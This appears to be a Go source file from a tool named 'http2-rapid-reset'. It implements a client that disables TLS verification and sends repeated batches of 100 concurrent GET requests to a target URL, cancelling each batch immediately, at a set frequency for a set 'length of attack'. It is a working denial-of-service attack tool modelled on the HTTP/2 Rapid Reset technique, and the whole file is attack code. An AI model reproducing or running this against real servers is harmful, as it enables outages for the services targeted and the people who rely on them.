// Common client implementations
package sender

import (
	"context"
	"crypto/tls"
	"http2-rapid-reset/pkg/terminal"
	"net/http"
	"sync"
	"time"
)

type Client struct {
	inner *http.Client

	tpt *http.Transport
	// the target address to perform requests to
	targetAddress string
}

// Create a new client instance with a target url
func NewClient(targetAddr string) *Client {

	transport := http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	var c http.Client = http.Client{Transport: &transport}

	return &Client{
		inner:         &c,
		tpt:           &transport,
		targetAddress: targetAddr,
	}
}

// Perform the rapid reset request specifying:
//
// - frequency: number of rapid-reset requests per second
//
// - duration: length of attack
func (client *Client) RapidResetRequests(
	frequency uint,
	duration time.Duration,
) error {

	var ev, ch = terminal.NewEvent("Rapid Resets")
	go ev.Start()
	defer terminal.StopEvent(ch)

	// req, err := http.NewRequest("GET", client.targetAddress, nil)
	// if err != nil {
	// 	return err
	// }

	// assume the max requests per stream is 100
	// so we send 100 simultaneous requests and reset the first one
	var req_per_stream int = 100

	var startTime time.Time = time.Now()

	// ticks every period: 1 / frequency
	numNanoSeconds := 1_000_000_000 / frequency
	var ticker time.Ticker = *time.NewTicker(time.Duration(numNanoSeconds))

	for time.Since(startTime) < duration {

		go func() {
			var wg sync.WaitGroup

			// fmt.Printf("Started: %v Now: %v\n", startTime, time.Now())

			req, err := http.NewRequest("GET", client.targetAddress, nil)
			if err != nil {
				return
			}

			streamCtx, streamCancel := context.WithCancel(context.Background())
			req = req.WithContext(streamCtx)

			// send out requests in batches
			for i := 0; i < req_per_stream; i++ {
				wg.Add(1)

				go client.request(req, streamCtx, &wg)
			}

			// upd8
			ch <- uint(req_per_stream)

			// perform the stream reset immediately
			streamCancel()

		}()

		// wait for `req_per_stream` periods
		for i := 0; i < req_per_stream; i++ {
			<-ticker.C
		}

	}

	return nil
}

// Perform a simple request
func (client *Client) request(
	req *http.Request,
	ctx context.Context,
	wg *sync.WaitGroup,
) error {
	defer wg.Done()

	_, err := client.inner.Do(req)

	select {
	case <-ctx.Done():
		return nil
	default:
		return err
	}

	// return err
}
